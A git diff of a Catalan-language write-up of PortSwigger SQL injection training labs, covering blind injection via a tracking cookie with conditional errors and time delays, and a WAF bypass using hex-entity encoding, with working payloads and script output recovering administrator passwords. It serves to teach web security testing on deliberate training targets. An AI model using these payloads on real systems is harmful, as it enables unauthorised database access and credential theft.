@@ -1,3 +1,6 @@
+# SQLI LABS: https://portswigger.net/web-security/sql-injection
+# CHEAT SHEET: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
 ## **Lab 1**: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
     /filter?category=Gifts' or 1=1-- -'
@@ -115,18 +118,135 @@
     Cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select 'a' from users where username='administrator' and length(password)>=20)='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8
 
     OUTPUT SCRIPT:
-    python3 SQLI_Conditional_Error.py
+    python3 SQLI_Conditional_Responses.py
     [◢] Fuerza Bruta: NQLIhBYeW4w1MyVo' and (select substring(password,20,1) from users where username='administrator')='m
     [→] Password: koa1z59sfl237dt7vmmm
 
 ## **Lab 12**: Blind SQL injection with conditional errors
+    
+    Aquest lab és bastant semblant a l'anterior. Tot i que en aquest cas no tindrem cap missatge com el de 'Welcome Back!', sinó que ens haurem de guiar per 'status_code' (els 200 i els 500, concretament).
 
+    Per sapiguer quina BBDD corre darrera, podem inserir el payload:
+        - Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select '')||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
+        Fent aixo ens mostrara un Internal Server Error (500).
+        -Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select '' from dual)||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
+        Ens mostra la pàgina correctament (200).
+        Oracle necessita SEMPRE una taula per ser llistada, per tant, estem sobre una BD d'Oracle.
+
+    Per sapiguer si existeix alguna taula:
+        - Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select '' from users where rownum=1)||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
+        Aquest payload ens mostra un 200, ja que si que existeix la taula 'users'.
+
+    Per sapiguer si existeix l'usuari 'administrator':
+        -Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
+        Les seqüències es llegeixen de dreta a esquerra. Com que l'username administrator existeix, passa al when. I com que 1=1 és cert, intenta fer 1/0. Aquesta operació és erronia i per tant et dona un 500.
+        Si canviem '1=1' a '2=1', com que això no és correcte, no entra al 'then' i fa l'else, que bàsicament és com "continua". I per tant, ens dona un 200. Ara sabem que l'usuari 'administrator' existeix.
+    
+    Per sapiguer la llargada de la passwd:
+        -Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select case when (2=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)>=20)||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
+        Això ens dona un 200. Si posem >=21, ens dona un 500. Per tant, sabem que la password té 20 caracters.
+    
+    Per sapiguer la password de l'usuari començem amb:
+        -Cookie: TrackingId=0LYsfMg5Xjr4mJeg'||(select case when substr(username,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'; session=42T80pRYOsMi4gXZOlOBD60iIB55V7Bw
+        Com que el primer caràcter de l'user 'administrator' és 'a',, doncs fes la operació 1/0. Com que no és possible, ens mostra un 500.
+        Ara podem canviar el valor 'username' pel de 'password' i començar a endevinar la password.
+        Per fer-ho automàticament, he creat l'script "SQLI_Conditional_Errors.py"
+
+    OUTPUT SCRIPT:
+    python3 SQLI_Conditional_Errors.py
+    [/] Fuerza Bruta: TrackingId=0LYsfMg5Xjr4mJeg'||(select case when   substr(password,20,1)='l' then to_char(1/0) else '' end from users where username='administrator')||'
+    [O] Password: fmic7lf2qnioxjuqbe2l
+               
 ## **Lab 13**: Blind SQL injection with time delays
+    Si a la Cookie li posem una ' o dues '', no s'ens mostra cap Server Internal Error. Podem provar de fer un sleep.
+    MYSQL:
+        Cookie: TrackingId=qaKF1WSyLRpktnlf' and sleep(5)-- ; session=SeDkzU5Sn7hIqzIZszwRyeDinYyQNy4C
+        La web NO tarda 5 segons a responde.
+    PostgreSQL:
+        Cookie: TrackingId=qaKF1WSyLRpktnlf'||pg_sleep(10)-- -; session=SeDkzU5Sn7hIqzIZszwRyeDinYyQNy4C
+        La web SI tarda 10 segons a responde.
 
 ## **Lab 14**: Blind SQL injection with time delays and information retrieval
+    Per comprovar que l'usuari 'administrator' existeix i tenir la base del nostre payload:
+        -Cookie: TrackingId=gPRaGnb5ptpIFWij'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- ; session=kUe45ch3Q2K3panMXfVrjLrBFxIqwPby
+        Si tarda 5 segons, l'usuari existeix. Sinó, 0.    
+
+    Per comprovar la longitud de la nostra password:
+        -Cookie: TrackingId=gPRaGnb5ptpIFWij'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' and length(password)>=20)-- ; session=kUe45ch3Q2K3panMXfVrjLrBFxIqwPby
+        Si la password té més o igual 20 caràcters, espera 5 segons, sinó, 0 segons. Si posem 21, veiem que tarda 0 segons.
+    
+    Per començar amb el payload de la contrasenya, utilitzem el paràmetre 'substring' com els anteriors labs.
+        -Cookie: TrackingId=gPRaGnb5ptpIFWij'||(select case when substring(username,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- ; session=kUe45ch3Q2K3panMXfVrjLrBFxIqwPby
+        En aquest cas, ens tardarà 5 segons a carregar la pàgina ja que el primer caràcter d'administrator és 'a'. Si posem, per exemple, 'b', tardarà 0 segons.
+    
+    Per endevinar la password, farem la mateixa seqüència que l'anterior comanda però canviant 'username' per 'password'. Com que ho hem de repetir 20 cops, fem un script anomenat SQLI_Blind.py.
+
+    OUTPUT SCRIPT:
+     python3 SQLI_Blind.py             
+    [▗] Fuerza Bruta: gPRaGnb5ptpIFWij'||(select case when substring(password,20,1)='z' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')--
+    [-] Password: c2fxff9rwefag2y4cvqz
+
 
 ## **Lab 15**: Blind SQL injection with out-of-band interaction
 
+    NEED BurpSuite Collaborator Client (Pro Version) - Pagant €
 ## **Lab 16**: Blind SQL injection with out-of-band data exfiltration
 
+    NEED BurpSuite Collaborator Client (Pro Version) - Pagant €
+
 ## **Lab 17**: SQL injection with filter bypass via XML encoding
+
+    La vulnerabilitat està a la casella de "check stock"
+    Amb el BurpSuit veiem:
+    POST /product/stock HTTP/1.1
+
+    Trobem aixó:
+        <?xml version="1.0" encoding="UTF-8"?>
+          <stockCheck>
+            <productId>
+            2
+            </productId>
+            <storeId>
+            1
+            </storeId>
+          </stockCheck>
+
+    Ens torna aixó:
+    HTTP/1.1 200 OK
+    481 units
+
+    Provem:
+    1 union SELECT NULL-- -
+    Ens dona:
+    "Attack detected"
+
+    Ens donen un HINT dient que instal·lem el 'Hackvertor' del Burpsuit:
+    Extender > BAppStore > Hackvertor > Install
+
+    Tornem al Repeater, seleccionem el nostre payload "1 union SELECT NULL-- -", click dret i ens dirigim a 'extensions>hackvertor>Encode>hex_entities'
+
+    Ara tindrem:
+    <?xml version="1.0" encoding="UTF-8"?>
+      <stockCheck>
+        <productId>
+        2
+        </productId>
+        <storeId>
+         <@hex_entities>
+         1 union SELECT NULL-- -
+         <@/hex_entities>
+        </storeId>
+      </stockCheck>
+
+    I si enviem la petició revem:
+        HTTP/1.1 200 OK 
+        481 units
+        null
+
+    Trobem la password:
+    <@hex_entities>
+         1 union select password from users where username='administrator'-- -
+    <@/hex_entities>
+
+    Resultat de la password:
+    lw43pol3r4vo60eke0w2
